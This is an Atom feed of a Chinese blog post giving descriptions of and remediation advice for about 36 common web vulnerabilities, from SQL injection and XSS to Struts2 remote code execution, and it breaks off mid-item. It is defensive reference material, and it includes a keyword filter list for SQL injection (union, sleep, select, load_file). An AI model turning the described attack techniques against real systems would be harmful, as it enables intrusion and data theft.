<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>T的网络日志</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2021-06-29T05:06:40.738Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>T</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>web常见漏洞修复建议</title>
    <link href="http://yoursite.com/2021/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE.html"/>
    <id>http://yoursite.com/2021/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE.html</id>
    <published>2021-06-29T05:04:34.000Z</published>
    <updated>2021-06-29T05:06:40.738Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1.SQL注入"></a>1.SQL注入</h2><p>　　<strong>漏洞描述</strong></p><p>　　Web程序中对于用户提交的参数未做过滤直接拼接到SQL语句中执行，导致参数中的特殊字符破坏了SQL语句原有逻辑，攻击者可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。</p><p>　　<strong>修复建议</strong></p><p>代码层最佳防御sql漏洞方案：使用预编译sql语句查询和绑定变量。</p><p>　　（1）使用预编译语句，使用PDO需要注意不要将变量直接拼接到PDO语句中。所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。</p><p>　　（2）对进入数据库的特殊字符（’”&lt;&gt;&amp;*;等）进行转义处理，或编码转换。</p><p>　　（3）确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。</p><p>　　（4）数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。</p><p>　　（5）网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。</p><p>　　（6）严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。</p><p>　　（7）避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。</p><p>　　（8）过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。</p><h2 id="2-XSS"><a href="#2-XSS" class="headerlink" title="2.XSS"></a>2.XSS</h2><p>　　<strong>漏洞描述</strong></p><p>　　1、Web程序代码中对用户提交的参数未做过滤或过滤不严，导致参数中的特殊字符破坏了HTML页面的原有逻辑，攻击者可以利用该漏洞执行恶意HTML/JS代码、构造蠕虫、篡改页面实施钓鱼攻击、以及诱导用户再次登录，然后获取其登录凭证等。</p><p>　　2、XSS攻击对Web服务器本身虽无直接危害，但是它借助网站进行传播，对网站用户进行攻击，窃取网站用户账号身份信息等，从而也会对网站产生较严重的威胁。</p><p>XSS攻击可导致以下危害：</p><p>　　1、钓鱼欺骗：最典型的就是利用目标网站的反射型跨站脚本漏洞将目标网站重定向到钓鱼网站，或者通过注入钓鱼JavaScript脚本以监控目标网站的表单输入，甚至攻击者基于DHTML技术发起更高级的钓鱼攻击。</p><p>　　2、网站挂马：跨站时，攻击者利用Iframe标签嵌入隐藏的恶意网站，将被攻击者定向到恶意网站上、或弹出恶意网站窗口等方式，进行挂马。</p><p>　　3、身份盗用：Cookie是用户对于特定网站的身份验证标志，XSS攻击可以盗取用户的cookie，从而利用该cookie盗取用户对该网站的操作权限。</p><p>　　4、盗取网站用户信息：当窃取到用户cookie从而获取到用户身份时，攻击者可以盗取到用户对网站的操作权限，从而查看用户隐私信息。</p><p>　　5、垃圾信息发送：在社交网站社区中，利用XSS漏洞借用被攻击者的身份发送大量的垃圾信息给特定的目标群。</p><p>　　6、劫持用户Web行为：一些高级的XSS攻击甚至可以劫持用户的Web行为，从而监视用户的浏览历史、发送与接收的数据等等。</p><p>　　7、XSS蠕虫：借助XSS蠕虫病毒还可以用来打广告、刷流量、挂马、恶作剧、破坏数据、实施DDoS攻击等。</p><p>　　<strong>修复建议</strong></p><p>xss漏洞本质上是一种html注入，也就是将html代码注入到网页中。那么其防御的根本就是在将用户提交的代码显示到页面上时做好一系列的过滤与转义</p><p>　　（1）过滤输入的数据，对例如：“ ‘ ”，“ “ ”，” &lt; “，” &gt; “，” on* “，script、iframe等危险字符进行严格的检查。这里的输入不仅仅是用户可以直接交互的输入接口，也包括HTTP请求中的Cookie中的变量，HTTP请求头部中的变量等。</p><p>　　（2）不仅验证数据的类型，还要验证其格式、长度、范围和内容。</p><p>　　（3）不仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。</p><p>　　（4）对输出到页面的数据进行相应的编码转换，如HTML实体编码、JS编码等。对输出的数据也要检查，数据库里的值有可能会在一个大网站的多处都有输出，即使在输入做了编码等操作，在各处的输出点时也要进行检查。</p><h2 id="3-XXE"><a href="#3-XXE" class="headerlink" title="3.XXE"></a>3.XXE</h2><p>　　<strong>漏洞详情</strong></p><p>　　参考：<a href="https://www.freebuf.com/company-information/165769.html" target="_blank" rel="noopener">https://www.freebuf.com/company-information/165769.html</a></p><h2 id="4-CSRF"><a href="#4-CSRF" class="headerlink" title="4.CSRF"></a>4.CSRF</h2><p>　　<strong>漏洞描述**</strong>：**</p><p>　　CSRF是跨站请求伪造，不攻击网站服务器，而是冒充用户在站内的正常操作。通常由于服务端没有对请求头做严格过滤引起的。CSRF会造成密码重置，用户伪造等问题，可能引发严重后果。绝大多数网站是通过 cookie 等方式辨识用户身份，再予以授权的。所以要伪造用户的正常操作，最好的方法是通过 XSS 或链接欺骗等途径，让用户在本机（即拥有身份 cookie 的浏览器端）发起用户所不知道的请求。CSRF攻击会令用户在不知情的情况下攻击自己已经登录的系统。</p><p>　　<strong>修复建议</strong></p><p>　　1、验证请求的Referer是否来自本网站，但可被绕过。</p><p>　　2、在请求中加入不可伪造的token，并在服务端验证token是否一致或正确，不正确则丢弃拒绝服务。</p><h2 id="5-SSRF"><a href="#5-SSRF" class="headerlink" title="5.SSRF"></a>5.SSRF</h2><p>　　<strong>漏洞描述</strong></p><p>　　SSRF（Server-Side Request Forgery，服务器端请求伪造）：通俗的来说就是我们可以伪造服务器端发起的请求，从而获取客户端所不能得到的数据。SSRF漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求的内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤。这个漏洞造成的危害有：</p><p>　　(1)、可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p><p>　　(2)、攻击运行在内网或本地的应用程序（比如溢出）;</p><p>　　(3)、对内网Web应用进行指纹识别，通过访问默认文件实现;</p><p>　　(4)、攻击内外网的Web应用，主要是使用Get参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）;</p><p>　　(5)、利用File协议读取本地文件。</p><p>　　<strong>修复建议</strong></p><p>　　1、禁用不需要的协议，只允许HTTP和HTTPS请求，可以防止类似于file://, gopher://, ftp:// 等引起的问题。</p><p>　　2、白名单的方式限制访问的目标地址，禁止对内网发起请求</p><p>　　3、过滤或屏蔽请求返回的详细信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p><p>　　4、验证请求的文件格式</p><p>　　5、禁止跳转</p><p>　　6、限制请求的端口为http常用的端口，比如 80、443、8080、8000等</p><p>　　7、统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p><h2 id="6-任意命令-代码执行"><a href="#6-任意命令-代码执行" class="headerlink" title="6.任意命令/代码执行"></a>6.任意命令/代码执行</h2><p>　　<strong>漏洞描述</strong></p><p>　　命令或代码执行漏洞是指代码未对用户可控参数做过滤，导致直接带入执行命令和代码，通过漏洞执行恶意构造的语句，执行任意命令或代码。攻击者可在服务器上执行任意命令，读写文件操作等，危害巨大。</p><p>　　<strong>修复建议</strong></p><p>　　1、严格过滤用户输入的数据，禁止执行非预期系统命令。</p><p>　　2、减少或不使用代码或命令执行函数</p><p>　　3、客户端提交的变量在放入函数前进行检测</p><p>　　4、减少或不使用危险函数</p><h2 id="7-任意文件上传"><a href="#7-任意文件上传" class="headerlink" title="7.任意文件上传"></a>7.任意文件上传</h2><p>　　<strong>漏洞描述</strong></p><p>　　文件上传漏洞通常由于代码中对文件上传功能所上传的文件过滤不严或web服务器相关解析漏洞未修复而造成的，如果文件上传功能代码没有严格限制和验证用户上传的文件后缀、类型等，攻击者可通过文件上传点上传任意文件，包括网站后门文件（webshell）控制整个网站。</p><p>　　<strong>修复建议</strong></p><p>　　1、对上传文件类型进行验证，除在前端验证外在后端依然要做验证，后端可以进行扩展名检测，重命名文件，MIME类型检测以及限制上传文件的大小等限制来防御，或是将上传的文件其他文件存储服务器中。</p><p>　　2、严格限制和校验上传的文件，禁止上传恶意代码的文件。同时限制相关上传文件目录的执行权限，防止木马执行。</p><p>　　3、对上传文件格式进行严格校验，防止上传恶意脚本文件；</p><p>　　4、严格限制上传的文件路径。</p><p>　　5、文件扩展名服务端白名单校验。</p><p>　　6、文件内容服务端校验。</p><p>　　7、上传文件重命名。</p><p>　　8、隐藏上传文件路径。</p><h2 id="8-目录穿越-目录遍历"><a href="#8-目录穿越-目录遍历" class="headerlink" title="8.目录穿越/目录遍历"></a>8.目录穿越/目录遍历</h2><p>　　<strong>漏洞描述</strong></p><p>　　文件下载或获取文件显示内容页面由于未对传入的文件名进行过滤，利用路径回溯符../跳出程序本身的限制目录，来下载或显示任意文件。</p><p>　　<strong>修复建议</strong></p><p>　　对传入的文件名参数进行过滤，并且判断是否是允许获取的文件类型，过滤回溯符../。</p><h2 id="9-文件包含"><a href="#9-文件包含" class="headerlink" title="9.文件包含"></a>9.文件包含</h2><p>　　<strong>漏洞描述</strong></p><p>　　本地文件包含是指程序在处理包含文件的时候没有严格控制。利用这个漏洞，攻击者可以先把上传的文件、网站日志文件等作为代码执行或直接显示出来，或者包含远程服务器上的恶意文件，进而获取到服务器权限。</p><p>　　<strong>修复建议</strong></p><p>　　1、严格检查变量是否已经初始化。</p><p>　　2、对所有输入提交可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现./和../等目录跳转符。</p><p>　　3、严格检查文件包含函数中的参数是否外界可控。</p><h2 id="10-弱口令"><a href="#10-弱口令" class="headerlink" title="10.弱口令"></a>10.弱口令</h2><p>　　<strong>漏洞描述</strong></p><p>　　由于网站用户帐号存在弱口令，导致攻击者通过弱口令可轻松登录到网站中，从而进行下一步的攻击，如上传webshell，获取敏感数据。</p><p>　　另外攻击者利用弱口令登录网站管理后台，可执行任意管理员的操作。</p><p>　　<strong>修复建议</strong></p><p>　　1、强制用户首次登录时修改默认口令，或是使用用户自定义初始密码的策略；</p><p>　　2、完善密码策略，信息安全最佳实践的密码策略为8位（包括）以上字符，包含数字、大小写字母、特殊字符中的至少3种。</p><p>　　3、增加人机验证机制，限制ip访问次数。</p><h2 id="11-暴力破解"><a href="#11-暴力破解" class="headerlink" title="11.暴力破解"></a>11.暴力破解</h2><p>　　<strong>漏洞描述</strong></p><p>　　由于没有对登录页面进行相关的人机验证机制，如无验证码、有验证码但可重复利用以及无登录错误次数限制等，导致攻击者可通过暴力破解获取用户登录账号和密码。</p><p>　　<strong>修复建议</strong></p><p>　　1、如果用户登录次数超过设置的阈值，则锁定帐号(有恶意登录锁定帐号的风险)</p><p>　　2、如果某个 IP登录次数超过设置的阈值，则锁定IP</p><p>　　3、增加人机验证机制</p><p>　　4、验证码必须在服务器端进行校验，客户端的一切校验都是不安全的。</p><h2 id="12-越权访问"><a href="#12-越权访问" class="headerlink" title="12.越权访问"></a>12.越权访问</h2><p>　　<strong>漏洞描述</strong></p><p>　　由于没有对用户访问角色的权限进行严格的检查及限制，导致当前账号可对其他账号进行相关操作，如查看、修改等。对低权限对高权限账户的操作为纵向越权，相同权限账户之间的操作成为横向越权也称水平越权。</p><p>　　<strong>修复建议</strong></p><p>　　1、对用户访问角色的权限进行严格的检查及限制。</p><p>　　2、在一些操作时可以使用session对用户的身份进行判断和控制</p><h2 id="13-未授权访问"><a href="#13-未授权访问" class="headerlink" title="13.未授权访问"></a>13.未授权访问</h2><p>　　<strong>漏洞描述</strong></p><p>　　由于没有对网站敏感页面进行登录状态、访问权限的检查，导致攻击者可未授权访问，获取敏感信息及进行未授权操作。</p><p>　　<strong>修复建议</strong></p><p>　　1、页面进行严格的访问权限的控制以及对访问角色进行权限检查。</p><p>　　2、可以使用session对用户的身份进行判断和控制。</p><h2 id="14-列目录"><a href="#14-列目录" class="headerlink" title="14.列目录"></a>14.列目录</h2><p>　　<strong>漏洞描述</strong></p><p>　　由于web服务器配置不当，开启了目录浏览，攻击者可获得服务器上的文件目录结构，获取敏感文件。</p><p>　　<strong>修复建议</strong></p><p>　　1、通过修改配置文件，禁止中间件（如IIS、apache、tomcat）的文件目录索引功能</p><p>　　2、设置目录访问权限</p><h2 id="15-PHP反序列化"><a href="#15-PHP反序列化" class="headerlink" title="15.PHP反序列化"></a>15.PHP反序列化</h2><p><strong>漏洞描述</strong></p><p>　　php反序列化漏洞也叫PHP对象注入，形成原因为程序未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行、文件操作、执行数据库操作等不可控后果。这一类攻击在java、python等面向对象语言中均存在。</p><p>可参考：<a href="https://www.freebuf.com/articles/web/167721.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/167721.html</a></p><p>　　<strong>修复建议</strong></p><p>　　1、对传入的对象进行严格的过滤检查</p><p>　　2、在反序列化过程执行的文件读写、命令或代码执行函数中是否有用户可控的参数。</p><h2 id="16-http-slow拒绝服务攻击"><a href="#16-http-slow拒绝服务攻击" class="headerlink" title="16.http slow拒绝服务攻击"></a>16.http slow拒绝服务攻击</h2><p>　　<strong>漏洞描述</strong></p><p>　　按照设计，HTTP协议要求服务器在处理之前完全接收请求。 如果HTTP请求没有完成，或者传输速率非常低，服务器会保持其资源忙于等待其余数据。如果服务器保持太多的资源请求和处理，这将造成一个拒绝服务。严重者一台主机即可让web运行缓慢甚至是崩溃。</p><p>　　<strong>修复建议</strong></p><p>　　对于 Apache 可以做以下优化（其他服务器原理相同）：</p><p>　　1、设置合适的 timeout 时间（Apache 已默认启用了 reqtimeout 模块），规定了 Header 发送的时间以及频率和 Body 发送的时间以及频率</p><p>　　2、增大 MaxClients(MaxRequestWorkers)：增加最大的连接数。根据官方文档，两个参数是一回事，版本不同，MaxRequestWorkers was called MaxClients before version 2.3.13.Theold name is still supported.</p><p>　　3、默认安装的 Apache 存在 Slow Attack 的威胁，原因就是虽然设置的 timeoute，但是最大连接数不够，如果攻击的请求频率足够大，仍然会占满Apache的所有连接</p><h2 id="17-CRLF注入"><a href="#17-CRLF注入" class="headerlink" title="17.CRLF注入"></a>17.CRLF注入</h2><p>　　<strong>漏洞描述</strong></p><p>　　CRLF 是“回车 +换行”（\r\n）的简称。在 HTTP 协议中，HTTPHeader 与 HTTP Body 是用两个 CRLF 符号进行分隔的，浏览器根据这两个 CRLF 符号来获取 HTTP 内容并显示。因此，一旦攻击者能够控制 HTTP 消息头中的字符，注入一些恶意的换行，就能注入一些会话 Cookie 或者 HTML 代码。</p><p>　　<strong>修复建议</strong></p><p>　　1、过滤 \r 、\n 及其各种编码的换行符，避免输入的数据污染到其他 HTTP 消息头。</p><h2 id="18-LDAP注入"><a href="#18-LDAP注入" class="headerlink" title="18.LDAP注入"></a>18.LDAP注入</h2><p>　　<strong>漏洞描述</strong></p><p>　　由于Web 应用程序没有对用户发送的数据进行适当过滤和检查，攻击者可修改LDAP 语句的结构，并且以数据库服务器、Web 服务器等的权限执行任意命令，许可权可能会允许查询、修改或除去 LDAP 树状构造内任何数据。</p><p>　　<strong>修复建议</strong></p><p>　　对用户的输入内容进行严格的过滤。</p><h2 id="19-URL-跳转"><a href="#19-URL-跳转" class="headerlink" title="19.URL 跳转"></a>19.URL 跳转</h2><p>　　<strong>漏洞描述</strong></p><p>　　有的Web 应用程序中使用URL参数中的地址作为跳转链接的功能 ，攻击者可实施钓鱼、恶意网站跳转等攻击。</p><p>　　<strong>修复建议</strong></p><p>　　1、在进行页面跳转前校验传入的URL是否为可信域名。</p><p>　　2、白名单规定跳转链接</p><h2 id="20-明文传输"><a href="#20-明文传输" class="headerlink" title="20.明文传输"></a>20.明文传输</h2><p>　　<strong>漏洞描述</strong></p><p>　　用户登录过程中使用明文传输用户登录信息，若用户遭受中间人攻击时，攻击者可直接获取该用户登录账户，从而进行进一步渗透。</p><p>　　<strong>修复建议</strong></p><p>　　1、用户登录信息使用加密传输，如密码在传输前使用安全的算法加密后传输，可采用的算法包括：不可逆hash算法加盐（4位及以上随机数，由服务器端产生）；安全对称加密算法，如AES(128、192、256位)，且必须保证客户端密钥安全，不可被破解或读出；非对称加密算法，如RSA(不低于1024位)、SM2等。</p><p>　　2、使用https来保证传输的安全。</p><h2 id="21-网页木马"><a href="#21-网页木马" class="headerlink" title="21.网页木马"></a>21.网页木马</h2><p>　　<strong>漏洞描述</strong></p><p>　　经渗透测试发现目标站点存在webshell，攻击者可直接爆破口令使用木马，非常低成本的进行恶意操作。</p><p>　　<strong>修复建议</strong></p><p>　　1、确认并删除木马文件，并进行本地文件漏洞扫描排查是否还存在有其他木马。</p><p>　　2、发现并及时修复已存在的漏洞。</p><p>　　3、通过查看日志、服务器杀毒等安全排查，确保服务器未被留下后门</p><h2 id="22-备份文件泄露"><a href="#22-备份文件泄露" class="headerlink" title="22.备份文件泄露"></a>22.备份文件泄露</h2><p>　　<strong>漏洞描述</strong></p><p>　　网站备份文件或、敏感信息文件存放在某个网站目录下，攻击者可通过文件扫描等方法发现并下载该备份文件，导致网站敏感信息泄露。</p><p>　　<strong>修复建议</strong></p><p>　　1、不在网站目录下存放网站备份文件或敏感信息的文件。</p><p>　　2、如需存放该类文件，请将文件名命名为难以猜解的无规则字符串。</p><h2 id="23-敏感信息泄露"><a href="#23-敏感信息泄露" class="headerlink" title="23.敏感信息泄露"></a>23.敏感信息泄露</h2><p>　　<strong>漏洞描述</strong></p><p>　　在页面中或者返回的响应包中泄露了敏感信息，通过这些信息，给攻击者渗透提供了非常多的有用信息。</p><p>　　<strong>修复建议</strong></p><p>　　1、如果是探针或测试页面等无用的程序建议删除，或者修改成难以猜解的名字。</p><p>　　2、不影响业务或功能的情况下删除或禁止访问泄露敏感信息页面。</p><p>　　3、在服务器端对相关敏感信息进行模糊化处理。</p><p>　　4、对服务器端返回的数据进行严格的检查，满足查询数据与页面显示数据一致。</p><h2 id="24-短信-邮件轰炸"><a href="#24-短信-邮件轰炸" class="headerlink" title="24.短信/邮件轰炸"></a>24.短信/邮件轰炸</h2><p>　　<strong>漏洞描述</strong></p><p>　　由于没有对短信或者邮件发送次数进行限制，导致可无限次发送短信或邮件给用户，从而造成短信轰炸，进而可能被大量用户投诉，从而影响公司声誉。<br>短信轰炸攻击时常见的一种攻击，攻击者通过网站页面中所提供的发送短信验证码的功能处，通过对其发送数据包的获取后，进行重放，如果服务器短信平台未做校验的情况时，系统会一直去发送短信，这样就造成了短信轰炸的漏洞。</p><p>攻击者通过填写他人的手机号，使用软件burpsuite的intruder功能重复提交发送短信的请求包，达到短时间内向他人的手机上发送大量垃圾短信的目的。</p><p>恶意攻击者可以利用漏洞攻击做到：</p><p>可对任意手机号轰炸-高危<br>只可对当前手机号轰炸-中危</p><p>　　<strong>修复建议</strong></p><p>　　在服务器限制发送短信或邮件的频率，如同一账号1分钟只能发送1次短信或邮件，一天只能发送3次。</p><h2 id="25-phpinfo信息泄漏"><a href="#25-phpinfo信息泄漏" class="headerlink" title="25.phpinfo信息泄漏"></a>25.phpinfo信息泄漏</h2><p>　　<strong>漏洞描述</strong></p><p>　　Web站点的某些测试页面可能会使用到PHP的phpinfo()函数，会输出服务器的关键信息，造成服务器信息泄露，为攻击提供有利的信息。</p><p>　　<strong>修复建议</strong></p><p>　　1、删除phpinfo 函数。</p><p>　　2、若文件无用可直接删除。 </p><h2 id="26-IIS短文件名泄露漏洞"><a href="#26-IIS短文件名泄露漏洞" class="headerlink" title="26.IIS短文件名泄露漏洞"></a>26.IIS短文件名泄露漏洞</h2><p>　　<strong>漏洞描述</strong></p><p>　　Internet Information Services（IIS，互联网信息服务）是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。 Microsoft IIS在实现上存在文件枚举漏洞，攻击者可利用此漏洞枚举网络服务器根目录中的文件。危害：攻击者可以利用“~”字符猜解或遍历服务器中的文件名，或对IIS服务器中的.Net Framework进行拒绝服务攻击。</p><p>　　攻击者可通过该漏洞尝试获取网站服务器文件的文件名，达到获取更多信息来入侵服务器的目的。</p><p>　　<strong>修复建议</strong></p><p>　　修改Windows配置，关闭短文件名功能。</p><p>　　1.关闭NTFS 8.3文件格式的支持。该功能默认是开启的，对于大多数用户来说无需开启。</p><p>　　2.如果是虚拟主机空间用户,可采用以下修复方案：</p><p>　　1）修改注册列表HKLM\SYSTEM\CurrentControlSet\Control\FileSystem\NtfsDisable8dot3NameCreation的值为1(此修改只能禁止NTFS8.3格式文件名创建,已经存在的文件的短文件名无法移除)。</p><p>　　2）如果你的web环境不需要asp.net的支持你可以进入Internet 信息服务(IIS)管理器 — Web 服务扩展 - ASP.NET 选择禁止此功能。</p><p>　　3）升级net framework 至4.0以上版本。</p><p>　　3.将web文件夹的内容拷贝到另一个位置，比如D:\www到D:\<a href="http://www.back，然后删除原文件夹D:\www，再重命名D:\www.back到D:\www。如果不重新复制，已经存在的短文件名则是不会消失的。" target="_blank" rel="noopener">www.back，然后删除原文件夹D:\www，再重命名D:\www.back到D:\www。如果不重新复制，已经存在的短文件名则是不会消失的。</a></p><h2 id="27-应用程序错误信息泄露"><a href="#27-应用程序错误信息泄露" class="headerlink" title="27.应用程序错误信息泄露"></a>27.应用程序错误信息泄露</h2><p>　　<strong>漏洞描述</strong></p><p>　　攻击者可通过特殊的攻击向量，使web服务器出现500、403等相关错误，导致信息泄漏如绝对路径、webserver版本、源代码、sql语句等敏感信息，恶意攻击者很有可能利用这些信息实施进一步的攻击。</p><p>　　<strong>修复建议</strong></p><p>　　1、自定义错误页面或使用统一的错误页面提示。</p><h2 id="28-Apache-Tomcat默认文件"><a href="#28-Apache-Tomcat默认文件" class="headerlink" title="28.Apache Tomcat默认文件"></a>28.Apache Tomcat默认文件</h2><p>　　<strong>漏洞描述</strong></p><p>　　Apache Tomcat默认样例文件没有删除或限制访问，可能存在cookie、session伪造，进行后台登录操作</p><p>　　<strong>修复建议</strong></p><p>　　1、删除样例文件</p><p>　　2、限制文件访问权限</p><h2 id="29-Crossdomain-xml-配置不当"><a href="#29-Crossdomain-xml-配置不当" class="headerlink" title="29.Crossdomain.xml 配置不当"></a>29.Crossdomain.xml 配置不当</h2><p>　　<strong>漏洞描述</strong></p><p>　　网站根目录下的 crossdomain.xml 文件指明了远程Flash 是否可以加载当前网站的资源（图片、网页内容、Flash等）。如果配置不当，可能导致遭受跨站请求伪造（CSRF）攻击。</p><p>　　<strong>修复建议</strong></p><p>　　对于不需要从外部加载资源的网站，在 crossdomain.xml 文件中更改allow-access-from的domain属性为域名白名单。</p><h2 id="30-目标服务器启用了不安全-HTTP-方法"><a href="#30-目标服务器启用了不安全-HTTP-方法" class="headerlink" title="30.目标服务器启用了不安全 HTTP 方法"></a>30.目标服务器启用了不安全 HTTP 方法</h2><p>　　<strong>漏洞描述</strong></p><p>　　目标服务器启用了不安全的传输方法，如PUT、TRACE、DELETE、MOVE等，这些方法表示可能在服务器上使用了 WebDAV，由于dav方法允许客户端操纵服务器上的文件，如上传、修改、删除相关文件等危险操作，如果没有合理配置dav，有可能允许未授权的用户对其进行利用，修改服务器上的文件。</p><p>　　<strong>修复建议</strong></p><p>　　1、关闭不安全的传输方法，只开启POST、GET方法。</p><p>　　2、如果服务器不使用 WebDAV 可直接禁用，或为允许webdav的目录配置严格的访问权限，如认证方法，认证需要的用户名，密码。</p><h2 id="31-weblogic-SSRF服务器请求伪造"><a href="#31-weblogic-SSRF服务器请求伪造" class="headerlink" title="31.weblogic SSRF服务器请求伪造"></a>31.weblogic SSRF服务器请求伪造</h2><p>　　<strong>漏洞描述</strong></p><p>　　目标存在weblogic SSRF服务器请求伪造漏洞。WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。Weblogic中间件默认带有“UDDI 目录浏览器”且为未授权访问，通过该应用，可进行无回显的SSRF请求。攻击者可利用该漏洞对企业内网进行大规模扫描，了解内网结构，并可能结合内网漏洞直接获取服务器权限。</p><p>　　<strong>修复建议</strong></p><p>　　1、若不影响业务则可删除uddiexplorer文件夹</p><p>　　2、限制uddiexplorer应用只能内网访问</p><h2 id="32-Apache-Struts2-远程代码执行漏洞（S2-019）"><a href="#32-Apache-Struts2-远程代码执行漏洞（S2-019）" class="headerlink" title="32.Apache Struts2 远程代码执行漏洞（S2-019）"></a>32.Apache Struts2 远程代码执行漏洞（S2-019）</h2><p>　　<strong>漏洞描述</strong></p><p>　　Apache Struts2的“Dynamic MethodInvocation”机制是默认开启的，仅提醒用户如果可能的情况下关闭此机制，如果未关闭此机制将导致远程代码执行漏洞，远程攻击者可利用此漏洞在受影响应用上下文中执行任意代码。</p><p>　　<strong>修复建议</strong></p><p>　　1、目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载。</p><p>　　2、或者手工设置struts.xml文件&lt;constantname=”struts.enable.DynamicMethodInvocation”value=”false”/&gt;</p><h2 id="33-Apache-Struts2-远程代码执行漏洞（S2-037）"><a href="#33-Apache-Struts2-远程代码执行漏洞（S2-037）" class="headerlink" title="33.Apache Struts2 远程代码执行漏洞（S2-037）"></a>33.Apache Struts2 远程代码执行漏洞（S2-037）</h2><p>　　<strong>漏洞描述</strong></p><p>　　Apache Struts2在使用REST插件时，攻击者可以绕过动态方法执行的限制，调用恶意表达式执行远程代码。</p><p>　　<strong>修复建议</strong></p><p>　　建议用户到官方获取最新补丁或者最新版本程序。</p><h2 id="34-Apache-Struts2-DevMode-远程代码执行漏洞"><a href="#34-Apache-Struts2-DevMode-远程代码执行漏洞" class="headerlink" title="34.Apache Struts2 DevMode 远程代码执行漏洞"></a>34.Apache Struts2 DevMode 远程代码执行漏洞</h2><p>　　<strong>漏洞描述</strong></p><p>　　为了便于开发人员调试程序，Struts2提供了一个devMode模式，可以方便查看程序错误以及日志等信息。当Struts2中的devMode模式设置为true时，存在严重远程代码执行漏洞。如果WebService 启动权限为最高权限时，可远程执行任意命令，包括关机、建立新用户、以及删除服务器上所有文件等等。</p><p>　　<strong>修复建议</strong></p><p>　　建议用户到官方获取最新补丁或者最新版本程序。</p><p>　　或者将struts.properties中的devMode设置为false，或是在struts.xml中添加如下代码： &lt;constant name=”struts.devMode”value=”false”/&gt;。</p><h2 id="35-Apache-Struts2-远程代码执行漏洞（S2-045）"><a href="#35-Apache-Struts2-远程代码执行漏洞（S2-045）" class="headerlink" title="35.Apache Struts2 远程代码执行漏洞（S2-045）"></a>35.Apache Struts2 远程代码执行漏洞（S2-045）</h2><p>　　<strong>漏洞描述</strong></p><p>　　Apache Struts2的Jakarta Multipartparser插件存在远程代码执行漏洞，漏洞编号为CVE-2017-5638。攻击者可以在使用该插件上传文件时，修改HTTP请求头中的Content-Type值来触发该漏洞，导致远程执行代码。</p><p>　　<strong>修复建议</strong></p><p>　　检测方式查看web目录下/WEB-INF/lib/目录下的struts-core.x.x.jar ，如果这个版本在Struts2.3.5 到 Struts2.3.31 以及 Struts2.5 到 Struts2.5.10之间则存在漏洞。</p><p>　　1、建议用户到官方获取最新补丁或者最新版本程序。</p><p>　　2、更新至Strusts2.3.32或者Strusts2.5.10.1，或使用第三方的防护设备进行防护。</p><p>　　3、临时解决方案：删除commons-fileupload-x.x.x.jar文件（会造成上传功能不可用）。</p><p>　　4、修改WEB-INF/classes目录下的配置</p><p>　　在WEB-INF/classes目录下的struts.xml中的struts 标签下添加</p><p>　　&lt;constantname=”struts.custom.i18n.resources”value=”global”/&gt;；</p><p>　　在WEB-INF/classes/目录下添加global.properties，文件内容如下:</p><p>　　struts.messages.upload.error.InvalidContentTypeException=1</p><h2 id="36-Apache-Struts2-远程代码执行漏洞（S2-033）"><a href="#36-Apache-Struts2-远程代码执行漏洞（S2-033）" class="headerlink" title="36.Apache Struts2 远程代码执行漏洞（S2-033）"></a>36.Apache Struts2 远程代码执行漏洞（S2-033）</h2><p>　　<strong>漏洞描述</strong></p><p>　　Apache Struts2在开启动态方法调用（DynamicMethod Invocation）的情况下，攻击者使用REST插件调用恶意表达式可以远程执行代码。</p><p>　　<strong>修复建议</strong></p><p>　　1、用户到官方获取最新补丁或者最新版本程序。</p><p>　　2、或者在允许的情况下禁用动态方法调用（Dynamic Method Invocation），修改Struts2的配置文件struts.xml，将struts.enable.DynamicMethodInvocation设置为“false”。</p><h2 id="37-redis相关漏洞修复"><a href="#37-redis相关漏洞修复" class="headerlink" 